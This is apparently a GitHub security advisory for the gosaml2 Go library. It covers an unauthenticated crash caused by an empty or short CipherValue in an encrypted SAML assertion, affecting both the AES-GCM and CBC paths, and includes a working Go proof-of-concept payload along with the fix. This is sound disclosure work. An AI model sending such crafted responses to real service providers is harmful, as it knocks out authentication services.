summary: gosaml2: Unauthenticated panic decrypting an EncryptedAssertion with a short or empty CipherValue
details:
### Summary

An attacker who can supply a crafted SAML Response for parsing can crash a `gosaml2` service provider by sending an `EncryptedAssertion` with AES-GCM encryption metadata and a `CipherValue` shorter than the GCM nonce size (12 bytes). The library panics with `slice bounds out of range` before any validation completes.

This is a **distinct issue from [GHSA-hwqm-qvj9-4jr2](https://github.com/russellhaering/gosaml2/security/advisories/GHSA-hwqm-qvj9-4jr2)**, which addressed panics in the AES-CBC decryption path (commit [`3418f9ae09063ff8df0ce1bd93f24e538e614def`](https://github.com/russellhaering/gosaml2/commit/3418f9ae09063ff8df0ce1bd93f24e538e614def), included in `v0.10.0`). That fix added a block-size check for CBC but left the AES-GCM path completely unprotected.

### Details

`ValidateEncodedResponse()` decrypts `EncryptedAssertion` nodes before signature or content validation completes. There are two call sites:

1. **Signed Response branch** -- [`decode_response.go#L341`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/decode_response.go#L341)
2. **Unsigned Response branch** -- [`decode_response.go#L388`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/decode_response.go#L388)

Both call `decryptAssertions()` ([`decode_response.go#L150-L200`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/decode_response.go#L150-L200)), which calls `EncryptedAssertion.DecryptBytes()` at [`decode_response.go#L176`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/decode_response.go#L176).

Inside `DecryptBytes()` ([`types/encrypted_assertion.go#L34-L92`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/types/encrypted_assertion.go#L34-L92)), the AES-GCM branch ([line 53, `case MethodAES128GCM, MethodAES192GCM, MethodAES256GCM:`](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/types/encrypted_assertion.go#L53)) slices the decoded ciphertext without checking its length at [line 59](https://github.com/russellhaering/gosaml2/blob/636e7dda202a4d669644e72404a82616ffcbe004/types/encrypted_assertion.go#L59):

```go
nonce, data := data[:c.NonceSize()], data[c.NonceSize():]
```

If `CipherValue` decodes to fewer than 12 bytes (GCM nonce size), Go panics with `slice bounds out of range`. All three GCM key sizes (AES-128-GCM, AES-192-GCM, AES-256-GCM) share the same vulnerable branch.

**Comparison with the patched CBC path:** The CBC branch (lines 65-88 of the same file) correctly checks `len(data) % k.BlockSize() != 0` before slicing -- this was the fix for GHSA-hwqm-qvj9-4jr2. The GCM branch has no equivalent guard.

The attacker only needs the SP's public certificate (typically available in SAML metadata) to wrap a symmetric key via RSA-OAEP. The `CipherValue` for the assertion body can be left empty. No valid signature is required.

### PoC

Test environment:
- Apple M4 (arm64)
- Go 1.26.1
- `gosaml2` v0.11.0 (commit `636e7dda202a4d669644e72404a82616ffcbe004`)

Self-contained reproduction:

```go
package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha1"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/base64"
	"fmt"
	"math/big"
	"os"
	"time"

	saml2 "github.com/russellhaering/gosaml2"
	dsig "github.com/russellhaering/goxmldsig"
)

func main() {
	// Generate a throwaway SP key pair.
	key, _ := rsa.GenerateKey(rand.Reader, 2048)
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "sp.example"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(time.Hour),
	}
	certDER, _ := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	cert := tls.Certificate{
		Certificate: [][]byte{certDER},
		PrivateKey:  key,
	}

	// Wrap an attacker-chosen symmetric key with the SP's public cert.
	symKey := make([]byte, 16)
	wrappedKey, _ := rsa.EncryptOAEP(sha1.New(), rand.Reader, &key.PublicKey, symKey, nil)

	responseXML := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
    Version="2.0" ID="_id" IssueInstant="2026-03-19T00:00:00Z">
  <saml2:Issuer>issuer.example</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </saml2p:Status>
  <saml2:EncryptedAssertion>
    <xenc:EncryptedData xmlns:xenc="http://www.w3.org/2001/04/xmlenc#">
      <xenc:EncryptionMethod Algorithm="http://www.w3.org/2009/xmlenc11#aes128-gcm"/>
      <xenc:CipherData><xenc:CipherValue></xenc:CipherValue></xenc:CipherData>
      <xenc:KeyInfo>
        <xenc:EncryptedKey>
          <xenc:EncryptionMethod Algorithm="http://www.w3.org/2001/04/xmlenc#rsa-oaep-mgf1p"/>
          <xenc:CipherData><xenc:CipherValue>%s</xenc:CipherValue></xenc:CipherData>
        </xenc:EncryptedKey>
      </xenc:KeyInfo>
    </xenc:EncryptedData>
  </saml2:EncryptedAssertion>
</saml2p:Response>`, base64.StdEncoding.EncodeToString(wrappedKey))

	encodedResponse := base64.StdEncoding.EncodeToString([]byte(responseXML))
	sp := &saml2.SAMLServiceProvider{
		AssertionConsumerServiceURL: "https://sp.example/acs",
		SPKeyStore:                  dsig.TLSCertKeyStore(cert),
	}

	defer func() {
		if r := recover(); r != nil {
			fmt.Printf("panic: %v\n", r)
			os.Exit(0)
		}
		fmt.Println("no panic")
		os.Exit(1)
	}()

	_, err := sp.ValidateEncodedResponse(encodedResponse)
	fmt.Printf("returned err: %v\n", err)
}
```

Observed output:

```text
panic: runtime error: slice bounds out of range [:12] with capacity 0
```

### Impact

An attacker who can supply a crafted SAML Response for parsing can crash the service provider process with a single small payload. The library does not use `recover()`, so the panic propagates and terminates the goroutine. The crash happens before any response validation completes, so no valid IdP relationship or signature is required.

### Suggested Fix

Add a ciphertext length check before splitting out the GCM nonce, matching the defensive pattern already used in the CBC branch:

```go
if len(data) < c.NonceSize() {
    return nil, fmt.Errorf("encrypted data is too short for AES-GCM nonce")
}
```


### Addendum: the CBC path was also affected

This advisory originally described the AES-GCM branch only, and stated that the CBC branch was correctly guarded by the fix for GHSA-hwqm-qvj9-4jr2. That turned out to be incomplete. The CBC guard was:

```go
if len(data)%k.BlockSize() != 0 {
	return nil, fmt.Errorf(...)
}
nonce, data := data[:k.BlockSize()], data[k.BlockSize():]
```

`0 % 16 == 0`, so an **empty** `CipherValue` passes the modulo check and panics on the following slice with `slice bounds out of range [:16] with capacity 0`. The earlier fix addressed a later panic in the padding-length read, not this one.

That second case was reported independently by @ericchiang and is merged into this advisory. Both researchers are credited as reporters above. Both branches now carry explicit length checks.

### Patch

Fixed in v0.12.0 by https://github.com/russellhaering/gosaml2/pull/281, which adds `len(data) < c.NonceSize()` before the GCM slice and `len(data) < k.BlockSize()` before the CBC slice.
